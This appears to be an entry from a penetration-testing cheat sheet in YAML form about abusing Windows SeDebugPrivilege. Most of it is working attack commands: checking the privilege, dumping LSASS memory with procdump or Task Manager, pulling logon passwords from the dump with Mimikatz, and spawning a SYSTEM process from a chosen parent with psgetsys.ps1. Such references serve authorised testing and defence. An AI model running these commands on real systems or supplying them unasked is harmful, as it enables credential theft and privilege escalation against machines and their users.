---
description: |
  This guide demonstrates how to enumerate and exploit the SeDebugPrivilege on Windows to dump LSASS process memory for credential extraction. It covers checking for SeDebugPrivilege, dumping LSASS using procdump or Task Manager, and extracting credentials with Mimikatz. These steps are useful for internal penetration testing and privilege escalation scenarios.

  Command Reference:

      Target: Local Windows machine with SeDebugPrivilege

command: |
  whoami /priv | findstr /i "SeDebugPrivilege"

code: |
  procdump.exe -accepteula -ma lsass.exe lsass.dmp
  mimikatz.exe
    log
    sekurlsa::minidump C:\PATH\OF\LSASS.dmp
    sekurlsa::logonpasswords

  From Task Manager: Details -> lsass.exe -> right click -> Create Dump File -> extract credentials with Mimikatz

  tasklist 
  .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://www.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/token-privileges
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/
  - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-
---